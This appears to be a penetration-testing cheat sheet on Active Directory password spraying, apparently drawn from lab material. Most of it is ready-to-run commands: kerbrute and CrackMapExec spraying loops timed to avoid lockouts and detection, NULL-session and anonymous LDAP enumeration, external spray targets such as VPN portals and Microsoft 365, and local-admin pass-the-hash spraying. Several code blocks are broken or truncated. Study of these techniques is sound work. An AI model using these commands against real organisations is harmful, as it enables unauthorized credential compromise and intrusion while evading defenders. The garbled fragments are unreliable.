# password-spraying

# 5.Password Spraying Overview

## 1. User Enumeration with Kerbrute

```bash
# Using a predefined username list
kerbrute userenum --dc <domain-controller> -d <domain> usernames.txt

# Using a generated username list (GUIDs example)
for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}; do echo $x; done > usernames.txt
```

```bash
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=frizz.htb 10.10.11.60
```

## 2. Password Spraying with Kerbrute

```bash
kerbrute passwordspray --dc <domain-controller> -d <domain> -U usernames.txt -p <common-password>
```

## 3. Password Spraying with CrackMapExec (CME)

```bash
cme smb <target-ip> -u usernames.txt -p <password> --no-bruteforce
```

## 4. Obtaining Password Policy (if internal access is available)

```powershell
net accounts
Get-ADDefaultDomainPasswordPolicy
```

## 5. Delay Consideration Between Sprays (Bash Example)

```bash
for password in Welcome1 Passw0rd Winter2022; do
    cme smb <target-ip> -u usernames.txt -p $password --no-bruteforce
    sleep 1800  # Wait 30 minutes to avoid account lockouts
done
```

## 6. Handling Large User Lists (Bash Example)

```bash
split -l 1000 usernames.txt user_chunk_
for file in user_chunk_*; do
    kerbrute passwordspray --dc <domain-controller> -d <domain> -U $file -p <password>
    sleep 1800
done
```

## 7. Post-Spray Enumeration

```bash
cme smb <target-ip> -u <username> -p <password> --shares
cme smb <target-ip> -u <username> -p <password> --sessions
```

## 8. Automation (Basic Script)

```bash
#!/bin/bash
PASSWORDS=(Welcome1 Passw0rd Winter2022)
for password in "${PASSWORDS[@]}"; do
    kerbrute passwordspray --dc <domain-controller> -d <domain> -U usernames.txt -p $password
    sleep 1800
done
```

## Notes:

### Adjust delay times based on password policy.

### Always confirm the password policy before attempting spraying.

### Use minimal attempts to avoid detection and lockouts.

# 6.Enumerating & Retrieving Password Policies

**CrackMapExec (CME):**

```bash
crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --pass-pol
```

- Retrieves detailed password policy information, including minimum password length, lockout thresholds, and complexity requirements.

### Enumerating Password Policies Without Credentials (Linux)

**SMB NULL Sessions:**

- Exploits misconfigurations in older Domain Controllers.
- **Tools:** rpcclient, enum4linux, enum4linux-ng, CrackMapExec.

**rpcclient:**

```bash
rpcclient -U "" -N 172.16.5.5
```

- Commands within rpcclient:
    - `querydominfo` - Retrieves domain information.
    - `getdompwinfo` - Retrieves password policy.

**enum4linux:**

```bash
enum4linux -P 172.16.5.5

- Enumerates various information, including password policy.

**enum4linux-ng:**

cat ilfreight.json
```

- Enhanced version of enum4linux with JSON/YAML output.

**Tools and Ports:**

- nbtstat: 137/UDP
- net: 139/TCP, 135/TCP, TCP and UDP 135 and 49152-65535
- rpcclient: 135/TCP
- smbclient: 445/TCP

**LDAP Anonymous Binds:**

- Exploits legacy configurations.
- **Tools:** ldapsearch, [windapsearch.py](http://windapsearch.py/), [ad-ldapdomaindump.py](http://ad-ldapdomaindump.py/).
**ldapsearch:**

```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### Enumerating Password Policies from Windows


```powershell
net use \\\\DC01\\ipc$ "" /u:""
    - Account lockout: System error 1909.

**Authenticated Access (Windows):**

```powershell
net accounts
```

- Retrieves password policy information.

**PowerView:**

```powershell
import-module .\\PowerView.ps1
Get-DomainPolicy
```

- Provides detailed policy information in PowerShell object format.

### Analyzing Password Policies

**Key Parameters:**

- Minimum password length.
- Account lockout threshold.
- Lockout duration.
- Password complexity requirements.

**Default Password Policy:**

- Maximum password age: 42 days.
- Minimum password age: 1 day.
- Minimum password length: 7.
- Password complexity: Enabled.
- Account lockout duration: Not set.
- Account lockout threshold: 0.
- Reset lockout counter: Not set.

- Importance of obtaining password policy.
- Precautions when policy is unknown.
- Avoiding account lockouts.
- Importance of creating a target user list.

Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```


---

- **Event ID 4625**: Failed Logon Attempts
- **Event ID 4771**: Kerberos Pre-Authentication Failures

---

**External Password Spraying Targets:**

- **Microsoft 365, Outlook Web Exchange**
- **VPN Portals (Fortinet, SonicWall, OpenVPN)**
- **Custom Web Apps using AD Authentication**

```bash
    rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority;
done
```

### Kerbrute - Kerberos Password Spraying
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

### CrackMapExec (CME) - SMB Password Spraying


### Local Administrator Password Reuse

### CrackMapExec - Local Admin Spraying

```bash
sudo crackmapexec smb --local-auth <NETWORK_RANGE> -u administrator -H <NTLM_HASH> | grep +
```